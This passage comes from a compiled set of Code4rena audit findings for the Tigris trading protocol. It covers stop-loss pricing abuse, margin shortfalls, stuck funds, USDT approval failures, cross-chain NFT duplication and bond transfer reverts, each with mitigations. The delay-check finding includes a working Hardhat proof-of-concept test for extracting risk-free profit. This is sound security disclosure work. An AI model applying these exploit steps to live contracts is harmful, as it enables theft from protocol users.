            if (_trade.direction) {
                if (_trade.slPrice < _price) revert(""6""); //LimitNotMet
            } else {
                if (_trade.slPrice > _price) revert(""6""); //LimitNotMet
            }
            //@audit stop loss is closed at user specified price NOT market price
            _limitPrice = _trade.slPrice;
        }
    }

When closing a position with a stop loss the user is closed at their SL price rather than the current price of the asset. A user could abuse this in directional markets with high leverage to make nearly risk free trades. A user could open a long with a stop loss that in $0.01 below the current price. If the price tanks immediately on the next update then they will be closed out at their entrance price, only out the fees to open and close their position. If the price goes up then they can make a large gain.

### Recommended Mitigation Steps

Take profit and stop loss trades should be executed at the current price rather than the price specified by the user:

             if (_trade.tpPrice == 0) revert(""7""); //LimitNotSet
            if (_trade.direction) {
                if (_trade.tpPrice > _price) revert(""6""); //LimitNotMet
            } else {
                if (_trade.tpPrice < _price) revert(""6""); //LimitNotMet
            }
    -       _limitPrice = _trade.tpPrice;
    +       _limitPrice = _price;
        } else {
            if (_trade.slPrice == 0) revert(""7""); //LimitNotSet
            if (_trade.direction) {
                if (_trade.slPrice < _price) revert(""6""); //LimitNotMet
            } else {
                if (_trade.slPrice > _price) revert(""6""); //LimitNotMet
            }
    -       _limitPrice = _trade.slPrice;
    +       _limitPrice = _price;

 >
> We also have a cooldown after a trade is opened so there will be enough time for price to move freely past the sl.



***"
192.md,Not enough margin pulled or burned from user when adding to a position,high,"*Submitted by [minhtrng](https://github.com/code-423n4/2022-12-tigris-findings/issues/659), also found by [Aymen0909](https://github.com/code-423n4/2022-12-tigris-findings/issues/644), [hansfriese](https://github.com/code-423n4/2022-12-tigris-findings/issues/505), [0Kage](https://github.com/code-423n4/2022-12-tigris-findings/issues/488), [Jeiwan](https://github.com/code-423n4/2022-12-tigris-findings/issues/433), [bin2chen](https://github.com/code-423n4/2022-12-tigris-findings/issues/325), [KingNFT](https://github.com/code-423n4/2022-12-tigris-findings/issues/209), [HollaDieWaldfee](https://github.com/code-423n4/2022-12-tigris-findings/issues/194), and [rvierdiiev](https://github.com/code-423n4/2022-12-tigris-findings/issues/130)*

When adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol, lowering the collateralization ratio of `tigAsset`.

### Proof of Concept

In `Trading.addToPosition` the `_handleDeposit` function is called like this:

```js
_handleDeposit(
    _trade.tigAsset,
    _marginAsset,
    _addMargin - _fee,
    _stableVault,
    _permitData,
    _trader
);
```

The third parameter with the value of `_addMargin - _fee` is the amount pulled (or burned in the case of using `tigAsset`) from the user. The `_fee` value is calculated as part of the position size like this:

```js
uint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);
```

The `_handleOpenFees` function mints `_tigAsset` to the referrer, to the `msg.sender` (if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the `_addMargin` value paid by the user. Hence using `_addMargin - _fee` as the third parameter to `_handleDeposit` is going to pull or burn less margin than what was accounted for.

An example for correct usage can be seen in `initiateMarketOrder`:

```js
uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);
uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;
_handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);
```

Here the third parameter to `_handleDeposit` is not `_marginAfterFees` but `_tradeInfo.margin` which is what the user has input on and is supposed to pay.

### Recommended Mitigation Steps

In `Trading.addToPosition` call the `_handleDeposit` function without subtracting the `_fee` value:

```js
_handleDeposit(
    _trade.tigAsset,
    _marginAsset,
    _addMargin,
    _stableVault,
    _permitData,
    _trader
);
```




***"
192.md,Lock.sol: claimGovFees function can cause assets to be stuck in the Lock contract,medium,"*Submitted by [HollaDieWaldfee](https://github.com/code-423n4/2022-12-tigris-findings/issues/73), also found by [\_\_141345\_\_](https://github.com/code-423n4/2022-12-tigris-findings/issues/404) and [0xdeadbeef0x](https://github.com/code-423n4/2022-12-tigris-findings/issues/99)*

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110> 

<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215>

### Impact

When calling [`Lock.claimGovFees`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110), assets that are set to be not allowed or assets that don't have any shares yet in the `BondNFT` contract will cause a silent failure in [`BondNFT.distribute`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215).

The funds from the `GovNFT` contract will get transferred into the `Lock` contract and then will be stuck there. They cannot be recovered.

### Proof of Concept

1.  An asset is added to the `BondNFT` contract by calling [`BondNFT.addAsset`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349)
2.  There are no bonds yet for this asset so the amount of shares for the asset is zero
3.  [`Lock.claimGovFees`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110) is called
4.  Funds are transferred from the `GovNFT` contract to the [`Lock` contract](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115)
5.  The call to `BondNFT.distribute` now fails quietly without reverting the transaction:
    ```solidity
     if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;
    ```
6.  The funds are now stuck in the `Lock` contract. They cannot be recovered.

### Tools Used

VS Code

### Recommended Mitigation Steps

A naive solution would be to use `revert` instead of `return` in `BondNFT.distribute` such that funds are either transferred from `GovNFT` to `Lock` and then to `BondNFT` or not at all.

```solidity
     ) external {
-        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;
+        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) revert;
         IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);
         unchecked {
             uint aEpoch = block.timestamp / DAY;
```

This however is an incomplete fix because if there is a single ""bad"" asset, rewards for the other assets cannot be distributed either.

Moreover functions like `Lock.lock` and `Lock.release` rely on `Lock.claimGovFees` to not revert.

So you might allow the owner to rescue stuck tokens from the `Lock` contract. Of course only allow rescuing the balance of the `Lock` contract minus the `totalLocked` of the asset in the `Lock` contract such that the locked amount cannot be rescued.



 >
> Because `claimGovFees` uses a delta balance, this means that those tokens will be stuck in the Lock Contract.
> 
> Because this finding shows a way to lose yield, due to an external condition, I agree with Medium Severity.




***"
192.md,Must approve 0 first,medium,"*Submitted by [0x4non](https://github.com/code-423n4/2022-12-tigris-findings/issues/104), also found by [kwhuo68](https://github.com/code-423n4/2022-12-tigris-findings/issues/632), [eierina](https://github.com/code-423n4/2022-12-tigris-findings/issues/626), [Deivitto](https://github.com/code-423n4/2022-12-tigris-findings/issues/586), [0xNazgul](https://github.com/code-423n4/2022-12-tigris-findings/issues/582), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-tigris-findings/issues/408), [imare](https://github.com/code-423n4/2022-12-tigris-findings/issues/391), [cccz](https://github.com/code-423n4/2022-12-tigris-findings/issues/301), and [rvierdiiev](https://github.com/code-423n4/2022-12-tigris-findings/issues/128)*

Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and then the actual allowance must be approved.

### Proof of Concept

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117>

```solidity
    function claimGovFees() public {
        address[] memory assets = bondNFT.getAssets();

        for (uint i=0; i < assets.length; i++) {
            uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));
            IGovNFT(govNFT).claim(assets[i]);
            uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));
            IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);// @audit this could fail always with some tokens, 
            bondNFT.distribute(assets[i], balanceAfter - balanceBefore);
        }
    }
```

### Recommended Mitigation Steps

Add an `approve(0)` before approving;

        function claimGovFees() public {
            address[] memory assets = bondNFT.getAssets();

            for (uint i=0; i < assets.length; i++) {
                uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));
                IGovNFT(govNFT).claim(assets[i]);
                uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));
                IERC20(assets[i]).approve(address(bondNFT), 0);
                IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);
                bondNFT.distribute(assets[i], balanceAfter - balanceBefore);
            }
      }






***"
192.md,Bypass the delay security check to win risk free funds,medium,"*Submitted by [KingNFT](https://github.com/code-423n4/2022-12-tigris-findings/issues/108), also found by [Critical](https://github.com/code-423n4/2022-12-tigris-findings/issues/495), [chaduke](https://github.com/code-423n4/2022-12-tigris-findings/issues/267), [0x52](https://github.com/code-423n4/2022-12-tigris-findings/issues/200), [noot](https://github.com/code-423n4/2022-12-tigris-findings/issues/49), and [orion](https://github.com/code-423n4/2022-12-tigris-findings/issues/44)*

The current implementation uses `_checkDelay()` function to prevent profitable opening and closing in the same tx with two different prices in the ""valid signature pool"". But the protection is not enough, an attacker can long with low price and short with high price at the same tx but two orders to lock profit and take risk free funds.

### Proof of Concept

The following test case and comments show the details for how to exploit it:

```
const { expect } = require(""chai"");
const { deployments, ethers, waffle } = require(""hardhat"");
const { parseEther, formatEther } = ethers.utils;
const { signERC2612Permit } = require('eth-permit');

describe(""Bypass delay check to earn risk free profit"", function () {

  let owner;
  let node;
  let user;
  let node2;
  let node3;
  let proxy;

  let Trading;
  let trading;

  let TradingExtension;
  let tradingExtension;

  let TradingLibrary;
  let tradinglibrary;

  let StableToken;
  let stabletoken;

  let StableVault;
  let stablevault;

  let position;

  let pairscontract;
  let referrals;

  let permitSig;
  let permitSigUsdc;

  let MockDAI;
  let MockUSDC;
  let mockusdc;

  let badstablevault;

  let chainlink;

  beforeEach(async function () {
    await deployments.fixture(['test']);
    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();
    StableToken = await deployments.get(""StableToken"");
    stabletoken = await ethers.getContractAt(""StableToken"", StableToken.address);
    Trading = await deployments.get(""Trading"");
    trading = await ethers.getContractAt(""Trading"", Trading.address);
    TradingExtension = await deployments.get(""TradingExtension"");
    tradingExtension = await ethers.getContractAt(""TradingExtension"", TradingExtension.address);
    const Position = await deployments.get(""Position"");
    position = await ethers.getContractAt(""Position"", Position.address);
    MockDAI = await deployments.get(""MockDAI"");
    MockUSDC = await deployments.get(""MockUSDC"");
    mockusdc = await ethers.getContractAt(""MockERC20"", MockUSDC.address);
    const PairsContract = await deployments.get(""PairsContract"");
    pairscontract = await ethers.getContractAt(""PairsContract"", PairsContract.address);
    const Referrals = await deployments.get(""Referrals"");
    referrals = await ethers.getContractAt(""Referrals"", Referrals.address);
    StableVault = await deployments.get(""StableVault"");
    stablevault = await ethers.getContractAt(""StableVault"", StableVault.address);
    await stablevault.connect(owner).listToken(MockDAI.address);
    await stablevault.connect(owner).listToken(MockUSDC.address);
    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);
    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(""1""));
    await tradingExtension.connect(owner).setNode(node.address, true);
    await tradingExtension.connect(owner).setNode(node2.address, true);
    await tradingExtension.connect(owner).setNode(node3.address, true);
    await network.provider.send(""evm_setNextBlockTimestamp"", [2000000000]);
    await network.provider.send(""evm_mine"");
    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);
    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);

    const BadStableVault = await ethers.getContractFactory(""BadStableVault"");
    badstablevault = await BadStableVault.deploy(StableToken.address);

    const ChainlinkContract = await ethers.getContractFactory(""MockChainlinkFeed"");
    chainlink = await ChainlinkContract.deploy();

    TradingLibrary = await deployments.get(""TradingLibrary"");
    tradinglibrary = await ethers.getContractAt(""TradingLibrary"", TradingLibrary.address);
    await trading.connect(owner).setLimitOrderPriceRange(1e10);
  });


  describe(""Simulate long with low price and short with high price at the same tx to lock profit"", function () {
    let longId;
    let shortId;
    beforeEach(async function () {
        let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 1, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
        let PriceData = [node.address, 1, parseEther(""1000""), 0, 2000000000, false];
        let message = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [node.address, 1, parseEther(""1000""), 0, 2000000000, false]
          )
        );
        let sig = await node.signMessage(
          Buffer.from(message.substring(2), 'hex')
        );
        
        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
        longId = await position.getCount();
        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
        expect(await position.assetOpenPositionsLength(1)).to.equal(1);

        TradeInfo = [parseEther(""1010""), MockDAI.address, StableVault.address, parseEther(""10""), 1, false, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
        PriceData = [node.address, 1, parseEther(""1010""), 0, 2000000000, false];
        message = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [node.address, 1, parseEther(""1010""), 0, 2000000000, false]
          )
        );
        sig = await node.signMessage(
          Buffer.from(message.substring(2), 'hex')
        );
        
        PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];
        shortId = await position.getCount();
        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
        expect(await position.assetOpenPositionsLength(1)).to.equal(2);
  
    });


    it.only(""Exit at any price to take profit"", async function () {
        // same time later, now we can close the orders
        await network.provider.send(""evm_setNextBlockTimestamp"", [2000000100]);
        await network.provider.send(""evm_mine"");

        // any new price, can be changed to other price such as 950, just ensure enough margin
        let closePrice = parseEther(""1050"");
        let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];
        let closeMessage = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [node.address, 1, closePrice, 0, 2000000100, false]
          )
        );
        let closeSig = await node.signMessage(
          Buffer.from(closeMessage.substring(2), 'hex')
        );
        
        let balanceBefore = await stabletoken.balanceOf(owner.address);
        await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
        await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
        let balanceAfter = await stabletoken.balanceOf(owner.address);
        let principal = parseEther(""1000"").add(parseEther(""1010""));

        let profit = balanceAfter.sub(balanceBefore).sub(principal);
        expect(profit.gt(parseEther(`50`))).to.equal(true);
    });

    it.only(""Exit with another price pair to double profit"", async function () {
      // some time later, now we can close the orders
      await network.provider.send(""evm_setNextBlockTimestamp"", [2000000100]);
      await network.provider.send(""evm_mine"");

      // any new price pair, can be changed to other price such as (950, 960), just ensure enough margin
      let closePrice = parseEther(""1050"");
      let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];
      let closeMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, closePrice, 0, 2000000100, false]
        )
      );
      let closeSig = await node.signMessage(
        Buffer.from(closeMessage.substring(2), 'hex')
      );
      
      let balanceBefore = await stabletoken.balanceOf(owner.address);

      // close long with high price
      await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);


      closePrice = parseEther(""1040"");
      closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];
      closeMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, closePrice, 0, 2000000100, false]
        )
      );
      closeSig = await node.signMessage(
        Buffer.from(closeMessage.substring(2), 'hex')
      );
      // close short with low price
      await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
      let balanceAfter = await stabletoken.balanceOf(owner.address);
      let principal = parseEther(""1000"").add(parseEther(""1010""));

      let profit = balanceAfter.sub(balanceBefore).sub(principal);
      expect(profit.gt(parseEther(`100`))).to.equal(true);
    });

  });
});


```

How to run

Put the test case to a new BypassDelayCheck.js file of test directory, and run:

    npx hardhat test

And the test result will be:

      Bypass delay check to earn risk free profit
        Simulate long with low price and short with high price at the same tx to lock profit
          √ Exit at any price to take profit
          √ Exit with another price pair to double profit

### Tools Used

VS Code, Hardhat

### Recommended Mitigation Steps

Cache recent lowest and highest prices, open long order with the highest price and short order with the lowest price.

 >
> Also we have spread and funding fees that would make this so hard to be profitable.





***"
192.md,Approved operators of Position token can't call Trading.initiateCloseOrder,medium,"*Submitted by [rvierdiiev](https://github.com/code-423n4/2022-12-tigris-findings/issues/124), also found by [\_\_141345\_\_](https://github.com/code-423n4/2022-12-tigris-findings/issues/401) and [UniversalCrypto](https://github.com/code-423n4/2022-12-tigris-findings/issues/280)*

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235> 

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849>

### Impact

Approved operators of owner of Position token can't call several function in Trading.

### Proof of Concept

Functions that accept Position token in Trading are checking that the caller is owner of token using `\_checkOwner` function. 

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849>

```soldiity
    function _checkOwner(uint _id, address _trader) internal view {
        if (position.ownerOf(_id) != _trader) revert(""2""); //NotPositionOwner   
    }
```

As you can see this function doesn't allow approved operators of token's owner to pass the check. As a resul, functions are not possible to call for them on behalf of owner.

For example [here](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235), there is a check that doesn't allow to call initiateCloseOrder function.

### Tools Used

VS Code

### Recommended Mitigation Steps

Allow operators of token's owner to call functions on behalf of owner.





***"
192.md,Failure in `endpoint` can cause minting more than one NFT with the same token id in different chains,medium,"*Submitted by [HE1M](https://github.com/code-423n4/2022-12-tigris-findings/issues/150)*

In the contract `GovNFT`, it is possible to bridge the governance NFT to other chains. It is also stated in the document that:

> NFT holders only earn the profits generated by the platform on the chain that the NFT is on.

It is assumed that there is only one unique NFT per token id. But there is a scenario that can lead to more than one NFT with the same token id on different chains.

### Proof of Concept

*   Suppose Bob (honest user who owns an NFT with token id X on chain B) plans to bridge this NFT from chain B to chain A. So, Bob calls the function `crossChain` to bridge the NFT from chain B to chain A. Thus, his NFT will be burnt on chain B, and it is supposed to be minted on chain A.

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124>

*   The `endpoint` is responsible for completing  the bridging task on chain A.
*   Suppose the `endpoint` calls the function `lzReceive` with low gas on chain A, so that the transaction will be not successful.

<!---->

    function lzReceive(
            uint16 _srcChainId,
            bytes memory _srcAddress,
            uint64 _nonce,
            bytes memory _payload
        ) external override {
            require(_msgSender() == address(endpoint), ""!Endpoint"");
            (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));
            // try-catch all errors/exceptions
            if (!success) {
                failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);
                emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);
            }
        }

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168>

*   Since the transaction was not successful, the message will be added as a failed message.

<!---->

    failedMessages[chainB][Bob's address][_nonce] = keccak256(_payload);

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178>

*   Then, due to network lag (or any server issue, or any failure in `endpoint`), the `endpoint` assumes that the transaction is not sent, and it again calls this function with enough gas, so, the NFT with token id X will be minted to Bob's address on chain A. The flow is as follows:

`lzReceive` ==> `nonblockingLzReceive` ==> `_nonblockingLzReceive` ==> `_bridgeMint`

*   Now Bob has the NFT on chain A. Moreover, he has a failed message on chain A.
*   Then Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. So, this NFT will be burnt on chain A, and minted to Bob's address on chain B.
*   Now, Bob has the NFT with token id X on chain B. Moreover, he has a failed message on chain A.
*   He calls the function `retryMessage` to retry the failed message on chain A.

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206>

*   By doing so the NFT with token id X will be minted to Bob on chain A. The flow is as follows:

`retryMessage` ==> `_nonblockingLzReceive` ==> `_bridgeMint`

*   Now Bob has the NFT with token id X on both chain A and chain B. This is the vulnerability.
*   Now he can, for example, sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.
*   Please note that Bob can not call the function `retryMessage` while he owns the NFT on chain A. Because during minting the NFT, it checks whether the token id exists or not. That is why Bob first bridges the NFT to another chain, and then retries the failed message.

***The vulnerability is that when the message is failed, it is not considered as consumed, so in case of a failure in `endpoint` it is possible to have failed messages and be able to mint it at the same time.***

Please note that if this scenario happens again, more NFTs with the same token id X will be minted to Bob on different chains.

### Recommended Mitigation Steps

It is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to the failed messages to be minted later.

    mapping(uint16 => mapping(bytes => mapping(uint64 => bool))) public consumedMessage;

        function lzReceive(
            uint16 _srcChainId,
            bytes memory _srcAddress,
            uint64 _nonce,
            bytes memory _payload
        ) external override {
            
            require(!consumedMessage[_srcChainId][_srcAddress][_nonce], ""already consumed"");
            consumedMessage[_srcChainId][_srcAddress][_nonce] = true;

            require(_msgSender() == address(endpoint), ""!Endpoint"");
            (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));
            // try-catch all errors/exceptions
            if (!success) {
                failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);
                emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);
            }
        }

 


 >
> This implementation of consumedMessage check returns instead of reverts. We don't want it to revert because that would cause the message queue to be blocked.



***"
192.md,BondNFTs can revert when transferred,medium,"*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-12-tigris-findings/issues/162)*

`BondNFT`s should be transferrable. According the the proposal and the sponsor, `BondNFT`s should could be sold and borrowed against.

The proposal for context: <https://gov.tigris.trade/#/proposal/0x2f2d1d63060a4a2f2718ebf86250056d40380dc7162fb4bf5e5c0b5bee49a6f3>

The current implementation limits selling/depositing to only the same day that rewards are distributed for the `tigAsset` of the bond.

The impact if no rewards are distributed in the same day:

1.  `BondNFT`s listed on open markets will not be able to fulfill the orders
2.  `BondNFT`s deposited as collateral will not be able to release the collateral

Because other market/platforms used for selling/depositing will not call `claimGovFees` to distribute rewards, they will revert when trying to transfer the `BondNFT`.

Realistic examples could be `BondNFT`s listed on OpenSea.

Example of reasons why rewards would not be distributed in the same day:

1.  Low activity from investors, rewards are distributed when users lock/release/extend
2.  `tigAsset` is blacklisted in `BondNFT`, rewards will not be distributed in such case.

### Proof of Concept

`BondNFT` has a mechanism to update the time `tigAsset` rewards are distributed. It uses a map that points to the last timestamp rewards were distributed for `epoch[tigAsset]`.

`distribute` function in `BondNFT`: <br><https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L221>

        function distribute(
            address _tigAsset,
            uint _amount
        ) external {
            if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;
            IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);
            unchecked {
                uint aEpoch = block.timestamp / DAY;
                if (aEpoch > epoch[_tigAsset]) {
                    for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {
                        epoch[_tigAsset] += 1;
                        accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];
                    }
                }
                accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];
            }
            emit Distribution(_tigAsset, _amount);
        }

(Please note that if the asset is blacklisted through `allowedAsset`, the  `epoch[tigAsset]` will not be updated)

When `BondNFT`s are transferred, a check is implemented to make sure `epoch[tigAsset]` is updated to the current day.

According to the sponsor, the reason for this check is to make sure that a bond that should be expired doesn't get transferred while the epoch hasn't yet been updated.

`_transfer` function in `BondNFT`: 
<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329>

        function _transfer(
            address from,
            address to,
            uint256 _id
        ) internal override {
            Bond memory bond = idToBond(_id);
            require(epoch[bond.asset] == block.timestamp/DAY, ""Bad epoch"");
            require(!bond.expired, ""Expired!"");
            unchecked {
                require(block.timestamp > bond.mintTime + 300, ""Recent update"");
                userDebt[from][bond.asset] += bond.pending;
                bondPaid[_id][bond.asset] += bond.pending;
            }
            super._transfer(from, to, _id);
        }

As can be seen above, if `epoch[tigAsset]` is not set to the same day of the transfer, the transfer will fail and the impacts in the impact section will happen.

### Hardhat POC

There is already an implemented test showing that transfers fail when `epoch[tigAsset]` is not updated: 

<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/test/09.Bonds.js#L472>

        it(""Bond can only transferred if epoch is updated"", async function () {
          await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(""3000""));
          await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther(""3000""), 365);

          await network.provider.send(""evm_increaseTime"", [864000]);
          await network.provider.send(""evm_mine"");

          await expect(bond.connect(owner).safeTransferMany(user.address, [1])).to.be.revertedWith(""Bad epoch"");
        });

### Tools Used

VS Code, Hardhat

### Recommended Mitigation Steps

The reason for the check is to validate that a bond.expired updated according to the actual timestamp.

Instead of having

            require(epoch[bond.asset] == block.timestamp/DAY, ""Bad epoch"");
            require(!bond.expired, ""Expired!"");

You could replace it with:

     require(bond.expireEpoch  >= block.timestamp/DAY, ""Transfer after expired not allowed"");

 



***"
192.md,Trading will not work on Ethereum if USDT is used,medium,"*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-12-tigris-findings/issues/198), also found by [rbserver](https://github.com/code-423n4/2022-12-tigris-findings/issues/673), [Rolezn](https://github.com/code-423n4/2022-12-tigris-findings/issues/670), [Ruhum](https://github.com/code-423n4/2022-12-tigris-findings/issues/669), [Faith](https://github.com/code-423n4/2022-12-tigris-findings/issues/456), [mookimgo](https://github.com/code-423n4/2022-12-tigris-findings/issues/277), [0x52](https://github.com/code-423n4/2022-12-tigris-findings/issues/241), [8olidity](https://github.com/code-423n4/2022-12-tigris-findings/issues/237), and [KingNFT](https://github.com/code-423n4/2022-12-tigris-findings/issues/62)*

Traders will not be able to:

1.  Initiate a market order
2.  Add margin
3.  Add to position
4.  initiate limit order

If USDT is set as the margin asset and protocol is deployed on Ethereum.

(Note: this issue was submitted after consulting with the sponsor even though currently there are no plans to deploy the platform on Ethereum).

### Proof of Concept

`USDT` has a race condition protection mechanism on ethereum chain:

It does not allow users to change the allowance without first changing the allowance to 0.

`approve` function in `USDT` on Ethereum: <br><https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L205>

        function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

            // To change the approve amount you first have to reduce the addresses`
            //  allowance to zero by calling `approve(_spender, 0)` if it is not
            //  already 0 to mitigate the race condition described here:
            //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
            require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

            allowed[msg.sender][_spender] = _value;
            Approval(msg.sender, _spender, _value);
        }

In `Trading`, if users use `USDT` as margin to:

1.  Initiate a market order
2.  Add margin
3.  Add to position
4.  initiate limit order

The transaction will revert.

This is due to the the `_handleDeposit` which is called in all of the above uses.

`_handleDeposit` calls the `USDT` margin asset `approve` function with `type(uint).max`.

From the second time `approve` will be called, the transaction will revert.

`_handleDeposit` in `Trading`: <br><https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652>

        function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault
    , ERC20PermitData calldata _permitData, address _trader) internal {
    ------
                IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);
                IERC20(_marginAsset).approve(_stableVault, type(uint).max);
                IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier);
    ------
        }

### Tools Used

VS Code

### Recommended Mitigation Steps

No need to to approve `USDT` every time.
The protocol could:

1.  Keep a record if allowance was already set on an address
2.  Create an external function that can be called by the owner to approve the a token address

  





***"
192.md,GovNFT: maxBridge has no effect,medium,"*Submitted by [cccz](https://github.com/code-423n4/2022-12-tigris-findings/issues/334), also found by [unforgiven](https://github.com/code-423n4/2022-12-tigris-findings/issues/675), [Madalad](https://github.com/code-423n4/2022-12-tigris-findings/issues/385), and [0xbepresent](https://github.com/code-423n4/2022-12-tigris-findings/issues/289)*

